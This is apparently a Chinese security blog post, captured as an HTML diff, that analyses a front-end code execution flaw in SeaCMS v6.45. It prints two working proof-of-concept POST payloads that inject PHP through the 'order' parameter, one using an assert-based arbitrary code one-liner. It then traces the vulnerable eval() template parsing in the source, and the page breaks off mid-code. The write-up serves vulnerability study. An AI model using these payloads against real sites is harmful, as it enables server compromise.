@@ -1,0 +1,477 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>SeaCMS v6.45前台代码执行漏洞分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SeaCMS v6.45前台代码执行漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-08-06 23:13" pubdate>
+        2018年8月6日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SeaCMS v6.45前台代码执行漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <p>SeaCMS没有使用框架，比较适合练习。</p>
+<a id="more"></a>
+
+<h3 id="1-源码下载"><a href="#1-源码下载" class="headerlink" title="1. 源码下载"></a>1. 源码下载</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>uw_VnxnvG4GGEae4TRsGGw<br><br>密码：cd48<br></code></pre></td></tr></table></figure>
+<h3 id="2-POC"><a href="#2-POC" class="headerlink" title="2. POC"></a>2. POC</h3><p>第一种</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/seacms/search.php<br><span class="hljs-type">POST</span>:search<span class="hljs-keyword">type</span>=5&amp;order=&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;<br></code></pre></td></tr></table></figure>
+<p>第二种</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">http:<span class="hljs-comment">//127.0.0.1/seacms/search.php</span><br>POST:searchtype=<span class="hljs-number">5</span>&amp;order=&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125; &#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)print<span class="hljs-constructor">_r($<span class="hljs-params">_POST</span>[<span class="hljs-params">a</span>]($<span class="hljs-params">_POST</span>[<span class="hljs-params">b</span>])</span>);<span class="hljs-comment">//&#125;&#123;end if&#125;&amp;a=assert&amp;b=phpinfo();</span><br></code></pre></td></tr></table></figure>
+<p>效果图</p>
+<p><img src="https://image.mengsec.com/18-8-6/49244924.jpg" srcset="/img/loading.gif"></p>
+<h3 id="3-漏洞原理分析"><a href="#3-漏洞原理分析" class="headerlink" title="3. 漏洞原理分析"></a>3. 漏洞原理分析</h3><h4 id="3-1-代码执行简单流程"><a href="#3-1-代码执行简单流程" class="headerlink" title="3.1 代码执行简单流程"></a>3.1 代码执行简单流程</h4><p><img src="https://image.mengsec.com/18-8-6/81792070.jpg" srcset="/img/loading.gif"></p>
+<h4 id="3-2-详细分析"><a href="#3-2-详细分析" class="headerlink" title="3.2 详细分析"></a>3.2 详细分析</h4><p>代码执行的原因是<code>$order</code>参数没做严格的限制，就将其传入了模板文件中，然后使用<code>eval()</code>执行模板中包含<code>$order</code>的代码。</p>
+<p> 首先，在文件<code>seacms/search.php</code>中，包含了文件<code>seacms/include/common.php</code>,在<code>common.php</code>中第45-48行，将GET,POST等请求传入的全局变量中的键值对转换成变量，并对其中的值使用<code>addslashes()</code>进行处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_RunMagicQuotes</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$svar</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span>(!get_magic_quotes_gpc())<br>	&#123;<br>		<span class="hljs-keyword">if</span>( is_array(<span class="hljs-variable">$svar</span>) )<br>		&#123;<br>			<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$svar</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) <span class="hljs-variable">$svar</span>[<span class="hljs-variable">$_k</span>] = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span><br>		&#123;<br>			<span class="hljs-variable">$svar</span> = addslashes(<span class="hljs-variable">$svar</span>); <span class="hljs-comment"># 转义单引号、双引号、反斜线、NULL</span><br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$svar</span>;<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>&#123;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>然后在<code>seacms/search.php</code>文件的<code>echoSearchPage()</code>函数中，也就是文件第63行，将变量注册成全局变量。</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>可以看到，在<code>search.php</code>中，执行<code>echoSearchPage()</code>函数之前，没有对<code>$order</code>变量进行处理。</p>
+<p>接着往下看，在<code>echoSearchPage()</code>函数中，使用<code>$searchtype</code>来选择使用的模板文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$searchtype</span>)==<span class="hljs-number">5</span>)<br>	&#123;<br>		<span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/cascade.html&quot;</span>;<br>		<span class="hljs-variable">$typeStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tid</span>)?intval(<span class="hljs-variable">$tid</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$yearStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$year</span>)?PinYin(<span class="hljs-variable">$year</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$letterStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$letter</span>)?<span class="hljs-variable">$letter</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$areaStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$area</span>)?PinYin(<span class="hljs-variable">$area</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$orderStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$order</span>)?<span class="hljs-variable">$order</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$jqStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$jq</span>)?<span class="hljs-variable">$jq</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br>		<span class="hljs-variable">$cacheName</span>=<span class="hljs-string">&quot;parse_cascade_&quot;</span>.<span class="hljs-variable">$typeStr</span>.<span class="hljs-variable">$yearStr</span>.<span class="hljs-variable">$letterStr</span>.<span class="hljs-variable">$areaStr</span>.<span class="hljs-variable">$orderStr</span>;<br>		<span class="hljs-variable">$pSize</span> = getPageSizeOnCache(<span class="hljs-variable">$searchTemplatePath</span>,<span class="hljs-string">&quot;cascade&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	&#125;<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$cfg_search_time</span>&amp;&amp;<span class="hljs-variable">$page</span>==<span class="hljs-number">1</span>) checkSearchTimes(<span class="hljs-variable">$cfg_search_time</span>);<br>		<span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/search.html&quot;</span>;<br>		<span class="hljs-variable">$cacheName</span>=<span class="hljs-string">&quot;parse_search_&quot;</span>;<br>		<span class="hljs-variable">$pSize</span> = getPageSizeOnCache(<span class="hljs-variable">$searchTemplatePath</span>,<span class="hljs-string">&quot;search&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+<p>当值是5时，会使用<code>cascade.html</code>，文件目录为<code>seacms\templets\default\html\cascade.html</code>，若不是，则会使用<code>earch.html</code>，文件目录为<code>seacms\templets\default\html\search.html</code>。</p>
+<p>下面153行，将模板文件读取到<code>$content</code>变量中，接着在155-173行替换标签。其中第158行使用<code>$order</code>替换了模板中<code>&#123;searchpage:ordername&#125;</code>标签。然后分别搜索<code>search.html</code>和<code>cascade.html</code>，只有<code>cascade.html</code>第79-81行存在该标签。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;最新上映&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-hit-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;hit&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderaddtime&quot;</span>&gt;最近热播&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-score-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;score&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;ordergold&quot;</span>&gt;评分最高&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+<p>因此，必须要<code>$searchtype==5</code>。</p>
+<p>接着往下走，在第212行</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span>=<span class="hljs-variable">$mainClassObj</span>-&gt;parseIf(<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure>
+<p>跟进去，在<code>seacms\include\main.class.php</code>中第3098-3147行中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseIf</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&#123;if:&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$labelRule</span> = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>, <span class="hljs-string">&quot;is&quot;</span>);<br>        <span class="hljs-variable">$labelRule2</span> = <span class="hljs-string">&quot;&#123;elseif&quot;</span>;<br>        <span class="hljs-variable">$labelRule3</span> = <span class="hljs-string">&quot;&#123;else&#125;&quot;</span>;<br>        preg_match_all(<span class="hljs-variable">$labelRule</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$iar</span>);<br>        <span class="hljs-variable">$arlen</span> = count(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-variable">$elseIfFlag</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$m</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$m</span> &lt; <span class="hljs-variable">$arlen</span>; <span class="hljs-variable">$m</span>++) &#123;<br>            <span class="hljs-variable">$strIf</span> = <span class="hljs-variable">$iar</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$m</span>];<br>            <span class="hljs-variable">$strIf</span> = <span class="hljs-keyword">$this</span>-&gt;parseStrIf(<span class="hljs-variable">$strIf</span>);<br>            <span class="hljs-variable">$strThen</span> = <span class="hljs-variable">$iar</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$m</span>];<br>            <span class="hljs-variable">$strThen</span> = <span class="hljs-keyword">$this</span>-&gt;parseSubIf(<span class="hljs-variable">$strThen</span>);<br>            <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$labelRule2</span>) === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$labelRule3</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$elsearray</span> = explode(<span class="hljs-variable">$labelRule3</span>, <span class="hljs-variable">$strThen</span>);<br>                    <span class="hljs-variable">$strThen1</span> = <span class="hljs-variable">$elsearray</span>[<span class="hljs-number">0</span>];<br>                    <span class="hljs-variable">$strElse1</span> = <span class="hljs-variable">$elsearray</span>[<span class="hljs-number">1</span>];<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strIf</span> . <span class="hljs-string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ifFlag</span>) &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strThen1</span>, <span class="hljs-variable">$content</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strElse1</span>, <span class="hljs-variable">$content</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strIf</span> . <span class="hljs-string">&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ifFlag</span>) &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$content</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$content</span>);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$elseIfArray</span> = explode(<span class="hljs-variable">$labelRule2</span>, <span class="hljs-variable">$strThen</span>);<br>                <span class="hljs-variable">$elseIfArrayLen</span> = count(<span class="hljs-variable">$elseIfArray</span>);<br>                <span class="hljs-variable">$elseIfSubArray</span> = explode(<span class="hljs-variable">$labelRule3</span>, <span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfArrayLen</span> - <span class="hljs-number">1</span>]);<br>                <span class="hljs-variable">$resultStr</span> = <span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">1</span>];<br>                <span class="hljs-variable">$elseIfArraystr0</span> = addslashes(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-number">0</span>]);<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(<span class="hljs-subst">&#123;$strIf&#125;</span>)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$elseIfArraystr0&#125;</span>\&quot;;&#125;&quot;</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-variable">$elseIfLen</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$elseIfLen</span> &lt; <span class="hljs-variable">$elseIfArrayLen</span>; <span class="hljs-variable">$elseIfLen</span>++) &#123;<br>                    <span class="hljs-variable">$strElseIf</span> = getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfLen</span>], <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                    <span class="hljs-variable">$strElseIf</span> = <span class="hljs-keyword">$this</span>-&gt;parseStrIf(<span class="hljs-variable">$strElseIf</span>);<br>                    <span class="hljs-variable">$strElseIfThen</span> = addslashes(getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfLen</span>], <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>));<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf</span> . <span class="hljs-string">&quot;)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$strElseIfThen&#125;</span>\&quot;;&#125;&quot;</span>);<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf</span> . <span class="hljs-string">&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elseIfFlag</span>) &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-variable">$strElseIf0</span> = getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-variable">$strElseIfThen0</span> = addslashes(getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>));<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strElseIf0</span>, <span class="hljs-string">&#x27;==&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; strpos(<span class="hljs-variable">$strElseIf0</span>, <span class="hljs-string">&#x27;=&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$strElseIf0</span> = str_replace(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;==&#x27;</span>, <span class="hljs-variable">$strElseIf0</span>);<br>                &#125;<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf0</span> . <span 